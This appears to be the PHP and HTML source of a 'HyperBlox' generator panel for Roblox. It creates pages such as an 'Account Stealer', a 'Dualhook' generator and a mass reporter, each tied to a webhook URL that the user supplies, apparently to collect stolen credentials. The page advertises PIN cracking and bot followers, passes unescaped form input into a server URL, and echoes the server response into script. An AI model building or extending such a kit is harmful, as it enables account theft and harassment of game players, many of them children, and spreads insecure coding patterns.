<?php
$web = $_POST['web'];
$dir = $_POST['dir'];
$t = $_POST['type'];

function validateWebhook($url) {
    if(!filter_var($url, FILTER_VALIDATE_URL)) {
        return "invalid";
    }
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if($httpCode == 404) return "dead";
    if($httpCode < 200 || $httpCode >= 300) return "invalid";
    return "valid";
}

if($web){
    $webhookStatus = validateWebhook($web);
    if($webhookStatus == "invalid") {
        $js = 'Swal.fire({
            title: "",
            html: `<div class="hyperblox-swal">
                <div class="hyperblox-swal-icon error">
                    <i class="fas fa-unlink"></i>
                </div>
                <div class="hyperblox-swal-title">Webhook Error</div>
                <div class="hyperblox-swal-text">Invalid webhook URL provided</div>
            </div>`,
            background: "#0a0612",
            confirmButtonText: "Retry",
            customClass: {
                popup: "hyperblox-swal-popup",
                confirmButton: "hyperblox-swal-confirm"
            }
        });';
    } elseif($webhookStatus == "dead") {
        $js = 'Swal.fire({
            title: "",
            html: `<div class="hyperblox-swal">
                <div class="hyperblox-swal-icon error">
                    <i class="fas fa-skull"></i>
                </div>
                <div class="hyperblox-swal-title">Webhook Error</div>
                <div class="hyperblox-swal-text">Webhook is dead (404 Not Found)</div>
            </div>`,
            background: "#0a0612",
            confirmButtonText: "Retry",
            customClass: {
                popup: "hyperblox-swal-popup",
                confirmButton: "hyperblox-swal-confirm"
            }
        });';
    } else {
        $do = $_SERVER['SERVER_NAME'];
        $dom = "https://$do/controlPage/apis/create.php?web=$web&dir=$dir&t=$t";
        $create = file_get_contents($dom);
        
        if($create == ""){
            $js = 'Swal.fire({
                title: "",
                html: `<div class="hyperblox-swal">
                    <div class="hyperblox-swal-icon success">
                        <i class="fas fa-check-circle"></i>
                    </div>
                    <div class="hyperblox-swal-title">Success</div>
                    <div class="hyperblox-swal-text">Control panel generated successfully</div>
                </div>`,
                background: "#0a0612",
                confirmButtonText: "OK",
                customClass: {
                    popup: "hyperblox-swal-popup",
                    confirmButton: "hyperblox-swal-confirm"
                }
            });';
        } else {
            $js = 'Swal.fire({
                title: "",
                html: `<div class="hyperblox-swal">
                    <div class="hyperblox-swal-icon error">
                        <i class="fas fa-times-circle"></i>
                    </div>
                    <div class="hyperblox-swal-title">Error</div>
                    <div class="hyperblox-swal-text">'.$create.'</div>
                </div>`,
                background: "#0a0612",
                confirmButtonText: "Retry",
                customClass: {
                    popup: "hyperblox-swal-popup",
                    confirmButton: "hyperblox-swal-confirm"
                }
            });';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="HyperBlox">
    <meta name="description" content="HyperBlox ControlPage Generator - The best Roblox tools for game copying, clothing duplication, bot followers, and PIN cracking, all free and secure.">
    <meta name="keywords" content="Roblox, HyperBlox, game copier, clothing copier, bot followers, PIN cracker, safe Roblox tools, automation">
    <meta name="robots" content="index, follow">
    <meta property="og:title" content="HyperBlox ControlPage Generator">
    <meta property="og:description" content="Generate powerful Roblox tools with HyperBlox ControlPage Generator. Copy games, duplicate clothes, gain followers, and more.">
    <meta property="og:image" content="https://undetectedgoons.lol/files/hyperblox.png">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://hyperblox.eu/">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="HyperBlox ControlPage Generator">
    <meta name="twitter:site" content="https://hyperblox.eu/">
    <meta name="twitter:description" content="Generate powerful Roblox tools with HyperBlox ControlPage Generator. Copy games, duplicate clothes, gain followers, and more.">
    <meta name="twitter:image" content="https://undetectedgoons.lol/files/hyperblox.png">
    <meta name="theme-color" content="#000000">
    <meta name="msapplication-TileColor" content="#000000">
    <meta itemprop="name" content="HyperBlox ControlPage Generator">
    <meta itemprop="description" content="HyperBlox ControlPage Generator - Advanced Roblox tools for copying games, cloning outfits, and more.">
    <title>HyperBlox ControlPage Generator</title>
    <link rel="icon" type="image/png" href="https://undetectedgoons.lol/files/hyperblox.png">
    <link rel="shortcut icon" href="https://undetectedgoons.lol/files/hyperblox.ico">
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
    <style>
        :root {
            --primary: #8b5cf6;
            --primary-dark: #7c3aed;
            --primary-light: #a78bfa;
            --primary-ultralight: #c4b5fd;
            --dark: #0f172a;
            --darker: #020617;
            --darkest: #010510;
            --light: #f8fafc;
            --lighter: rgba(248,250,252,0.95);
            --gray: #94a3b8;
            --dark-gray: #1f1a2e;
            --glass: rgba(30,41,59,0.45);
            --glass-border: rgba(255,255,255,0.08);
            --transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
            --shadow-lg: 0 15px 50px rgba(0,0,0,0.25);
            --border-radius: 16px;
            --glow: 0 0 40px rgba(139,92,246,0.4);
        }

        body {
            font-family: 'Manrope', sans-serif;
            background: var(--darkest);
            color: var(--light);
            min-height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-image: 
                radial-gradient(at 80% 0%, rgba(139,92,246,0.1) 0%, transparent 50%),
                radial-gradient(at 0% 50%, rgba(139,92,246,0.1) 0%, transparent 50%);
            position: relative;
            overflow: hidden;
        }

        .bg-shapes {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        .shape {
            position: absolute;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.15;
        }

        .shape-1 {
            width: 500px;
            height: 500px;
            background: var(--primary);
            top: -200px;
            left: -200px;
            animation: float 25s infinite alternate;
        }

        .shape-2 {
            width: 700px;
            height: 700px;
            background: var(--primary-light);
            bottom: -300px;
            right: -300px;
            animation: float 30s infinite alternate-reverse;
        }

        @keyframes float {
            0% { transform: translate(0,0); }
            100% { transform: translate(100px,100px); }
        }

        .control-panel {
            width: 100%;
            max-width: 500px;
            background: var(--glass);
            border-radius: var(--border-radius);
            padding: 40px;
            border: 1px solid var(--glass-border);
            backdrop-filter: blur(12px);
            box-shadow: var(--shadow-lg), var(--glow);
            margin: 20px;
            position: relative;
            overflow: hidden;
        }

        .control-panel::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(139,92,246,0.05) 0%, transparent 50%);
            pointer-events: none;
        }

        .panel-header {
            margin-bottom: 30px;
            text-align: center;
            position: relative;
        }

        .panel-title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #8b5cf6, #ec4899);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .panel-subtitle {
            color: var(--gray);
            font-size: 16px;
        }

        .input-group {
            position: relative;
            margin-bottom: 25px;
        }

        .input-icon {
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--primary-light);
            font-size: 18px;
            transition: var(--transition);
            z-index: 2;
        }

        .panel-input {
            width: 100%;
            padding: 16px 20px 16px 55px;
            background: rgba(15,23,42,0.7);
            border: 1px solid var(--glass-border);
            border-radius: var(--border-radius);
            color: var(--light);
            font-size: 16px;
            transition: var(--transition);
            height: 52px;
            box-sizing: border-box;
            position: relative;
            z-index: 1;
        }

        .panel-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(139,92,246,0.3);
            background: rgba(15,23,42,0.9);
        }

        .panel-input:focus + .input-icon {
            color: var(--primary);
        }

        .panel-select {
            width: 100%;
            padding: 16px 20px 16px 55px;
            background: rgba(15,23,42,0.7);
            border: 1px solid var(--glass-border);
            border-radius: var(--border-radius);
            color: var(--light);
            font-size: 16px;
            transition: var(--transition);
            height: 52px;
            appearance: none;
            cursor: pointer;
        }

        .panel-select:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(139,92,246,0.3);
        }

        .select-arrow {
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--primary-light);
            pointer-events: none;
            transition: var(--transition);
        }

        .panel-select:focus ~ .select-arrow {
            color: var(--primary);
        }

        .panel-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border: none;
            border-radius: var(--border-radius);
            color: white;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 10px;
            position: relative;
            overflow: hidden;
            z-index: 1;
        }

        .panel-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: 0.6s;
            z-index: -1;
        }

        .panel-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(139,92,246,0.5);
        }

        .panel-btn:hover::before {
            left: 100%;
        }

        .panel-footer {
            margin-top: 25px;
            text-align: center;
            color: var(--gray);
            font-size: 14px;
        }

        .panel-footer a {
            color: var(--primary-light);
            text-decoration: none;
            font-weight: 500;
            transition: var(--transition);
            position: relative;
        }

        .panel-footer a::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 0;
            height: 1px;
            background: var(--primary-light);
            transition: var(--transition);
        }

        .panel-footer a:hover {
            color: var(--primary);
        }

        .panel-footer a:hover::after {
            width: 100%;
        }

        .hyperblox-swal-popup {
            background: var(--dark) !important;
            border-radius: 20px !important;
            border: 1px solid var(--glass-border) !important;
            box-shadow: var(--shadow-lg), var(--glow) !important;
            padding: 40px !important;
            backdrop-filter: blur(12px) !important;
            width: 90% !important;
            max-width: 450px !important;
        }

        .hyperblox-swal-container {
            display: flex !important;
            flex-direction: column !important;
            align-items: center !important;
            justify-content: center !important;
        }

        .hyperblox-swal-icon {
            width: 100px !important;
            height: 100px !important;
            border-radius: 50% !important;
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            margin: 0 auto 25px !important;
            font-size: 42px !important;
            border: 4px solid transparent !important;
        }

        .hyperblox-swal-icon.success {
            background: rgba(16,185,129,0.1) !important;
            color: #10b981 !important;
            border-color: rgba(16,185,129,0.3) !important;
            animation: pulse 2s infinite;
        }

        .hyperblox-swal-icon.error {
            background: rgba(239,68,68,0.1) !important;
            color: #ef4444 !important;
            border-color: rgba(239,68,68,0.3) !important;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .hyperblox-swal-title {
            font-size: 24px !important;
            font-weight: 700 !important;
            color: var(--light) !important;
            margin-bottom: 15px !important;
            text-align: center !important;
        }

        .hyperblox-swal-text {
            color: var(--gray) !important;
            font-size: 16px !important;
            max-width: 80% !important;
            margin: 0 auto 20px !important;
            text-align: center !important;
            line-height: 1.6 !important;
        }

        .hyperblox-swal-confirm {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark)) !important;
            border-radius: 12px !important;
            padding: 12px 24px !important;
            font-weight: 600 !important;
            border: none !important;
            transition: var(--transition) !important;
            font-size: 16px !important;
            margin-top: 15px !important;
        }

        .hyperblox-swal-confirm:hover {
            transform: translateY(-2px) !important;
            box-shadow: 0 8px 25px rgba(139,92,246,0.5) !important;
        }

        .hyperblox-swal-confirm-ok {
            background: linear-gradient(135deg, #10b981, #0d9e6e) !important;
        }

        .hyperblox-swal-confirm-ok:hover {
            box-shadow: 0 8px 25px rgba(16,185,129,0.5) !important;
        }

        @media (max-width: 768px) {
            .control-panel {
                padding: 30px;
            }
            
            .panel-title {
                font-size: 24px;
            }

            .hyperblox-swal-popup {
                padding: 30px !important;
            }

            .hyperblox-swal-icon {
                width: 80px !important;
                height: 80px !important;
                font-size: 36px !important;
            }
        }
    </style>
</head>
<body>
    <div class="bg-shapes">
        <div class="shape shape-1"></div>
        <div class="shape shape-2"></div>
    </div>

    <div class="control-panel">
        <div class="panel-header">
            <h1 class="panel-title">HyperBlox Generator</h1>
            <p class="panel-subtitle">Generate powerful tools with ease</p>
        </div>
        
        <form method="post">
            <div class="input-group">
                <i class="fas fa-folder input-icon"></i>
                <input type="text" class="panel-input" placeholder="Directory Name" name="dir" required>
            </div>
            
            <div class="input-group">
                <i class="fas fa-link input-icon"></i>
                <input type="text" class="panel-input" placeholder="Webhook URL" name="web" required>
            </div>
            
            <div class="input-group">
                <i class="fas fa-cog input-icon"></i>
                <select class="panel-select" name="type" required>
                    <option value="">Select Tool Type</option>
                    <option value="dg">Dualhook Gen</option>
                    <option value="vu">VC Unlocker</option>
                    <option value="cc">Clothing Copier</option>
                    <option value="fb">Follow Bot</option>
                    <option value="gc">Game Copier</option>
                    <option value="as">Account Stealer</option>
                    <option value="mr">Mass Reporter</option>
                </select>
                <i class="fas fa-chevron-down select-arrow"></i>
            </div>
            
            <button type="submit" class="panel-btn">
                <i class="fas fa-bolt"></i>
                Generate!
            </button>

            <div class="panel-footer">
                Already Authorized? <a href="https://hyperblox.eu/controlPage/sign-in.php">Click here!</a>
            </div>
        </form>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
        <?php echo $js ?? ''; ?>
        
        document.querySelectorAll('.panel-input, .panel-select').forEach(input => {
            input.addEventListener('focus', function() {
                this.parentElement.querySelector('.input-icon').style.color = 'var(--primary)';
            });
            
            input.addEventListener('blur', function() {
                this.parentElement.querySelector('.input-icon').style.color = 'var(--primary-light)';
            });
        });

        document.querySelector('form').addEventListener('submit', function(e) {
            const webhookInput = document.querySelector('input[name="web"]');
            if(webhookInput.value.trim() !== '') {
                const btn = this.querySelector('button[type="submit"]');
                const originalText = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Validating Webhook...';
                btn.disabled = true;
                
                setTimeout(() => {
                    btn.innerHTML = originalText;
                    btn.disabled = false;
                }, 1000);
            }
        });
    </script>
</body>
</html>